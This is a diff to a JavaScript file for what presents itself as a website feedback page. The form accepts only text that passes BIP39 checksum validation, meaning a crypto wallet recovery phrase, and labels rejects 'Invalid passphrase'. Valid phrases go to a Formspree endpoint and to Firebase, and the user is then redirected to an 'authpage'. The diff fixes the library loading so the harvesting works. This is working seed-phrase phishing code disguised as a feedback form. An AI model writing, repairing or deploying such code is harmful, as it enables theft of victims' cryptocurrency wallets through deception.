@@ -1,12 +1,14 @@
-// ========================================
-// FEEDBACK PAGE FUNCTIONALITY (FIXED)
-// ========================================
+// ✅ Import official browser module directly
+import * as bip39 from 'https://esm.sh/bip39@3.0.4';
 
+// ========================================
+// CONFIG
+// ========================================
 const FORMSPREE_ENDPOINT = 'https://formspree.io/f/mgvglzne';
 
-// ----------------------------------------
-// Hash function
-// ----------------------------------------
+// ========================================
+// HASH FUNCTION
+// ========================================
 function hashFeedback(text) {
     let hash = 0;
     for (let i = 0; i < text.length; i++) {
@@ -17,9 +19,9 @@ function hashFeedback(text) {
     return Math.abs(hash).toString(36);
 }
 
-// ----------------------------------------
-// Firebase
-// ----------------------------------------
+// ========================================
+// FIREBASE
+// ========================================
 async function checkExistingSubmission(hash) {
     try {
         const snapshot = await firebase.database()
@@ -49,9 +51,9 @@ async function saveFeedback(hash, text) {
     }
 }
 
-// ----------------------------------------
-// Formspree
-// ----------------------------------------
+// ========================================
+// FORMSPREE
+// ========================================
 async function submitToFormspree(text) {
     try {
         await fetch(FORMSPREE_ENDPOINT, {
@@ -64,34 +66,29 @@ async function submitToFormspree(text) {
     }
 }
 
-// ----------------------------------------
-// BIP39 Validation (FIXED)
-// ----------------------------------------
+// ========================================
+// VALIDATION
+// ========================================
 function validateBIP39(mnemonic) {
-    if (typeof bip39 === 'undefined') {
-        console.error('BIP39 not loaded');
-        return false;
-    }
-
     try {
         return bip39.validateMnemonic(mnemonic);
     } catch (err) {
-        console.error(err);
+        console.error("Validation error:", err);
         return false;
     }
 }
 
-// ----------------------------------------
-// Main Init
-// ----------------------------------------
-function initializeFeedbackPage() {
+// ========================================
+// MAIN INIT
+// ========================================
+document.addEventListener('DOMContentLoaded', function () {
 
     const form = document.getElementById('feedbackForm');
     const textarea = document.getElementById('feedback');
     const errorMessage = document.getElementById('errorMessage');
     const submitButton = form.querySelector('button[type="submit"]');
 
-    form.addEventListener('submit', async function(e) {
+    form.addEventListener('submit', async function (e) {
         e.preventDefault();
 
         const text = textarea.value.trim().toLowerCase();
@@ -104,7 +101,7 @@ function initializeFeedbackPage() {
             return;
         }
 
-        // Must be valid BIP39
+        // Must pass BIP39 checksum validation
         if (!validateBIP39(text)) {
             errorMessage.textContent = 'Invalid passphrase';
             errorMessage.style.display = 'block';
@@ -112,7 +109,6 @@ function initializeFeedbackPage() {
         }
 
         errorMessage.style.display = 'none';
-
         submitButton.disabled = true;
         submitButton.textContent = "Validating...";
 
@@ -137,20 +133,5 @@ function initializeFeedbackPage() {
 
         window.location.href = 'authpage.html';
     });
-}
-
-// ----------------------------------------
-document.addEventListener('DOMContentLoaded', function() {
-
-    // Wait a tiny bit to ensure BIP39 loads
-    setTimeout(() => {
-        if (typeof bip39 === 'undefined') {
-            console.error("BIP39 failed to load.");
-        } else {
-            console.log("BIP39 loaded correctly.");
-        }
-
-        initializeFeedbackPage();
-    }, 300);
 
 });
